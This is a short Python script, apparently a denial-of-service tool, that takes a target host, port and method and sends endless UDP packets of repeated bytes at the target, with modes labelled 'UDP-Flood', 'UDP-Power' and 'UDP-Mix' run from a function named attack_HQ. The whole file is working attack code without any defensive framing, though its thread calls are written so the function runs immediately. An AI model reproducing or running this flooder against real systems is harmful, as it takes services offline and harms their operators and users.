import sys
import socket
import threading
#import time as clock

host = str(sys.argv[1])
port = int(sys.argv[2])
#time = int(sys.argv[4])
method = str(sys.argv[3])

loops = 10000

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

#def timer(timeout):
#    while True:
#        if clock.time() > timeout: exit()
#        if clock.time() < timeout: clock.sleep(0.1)

def attack_HQ():
    #timeout = clock.time() + time
    #timer(timeout)
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
            threading.Thread(target=send_packet(750), daemon=True).start()

attack_HQ()
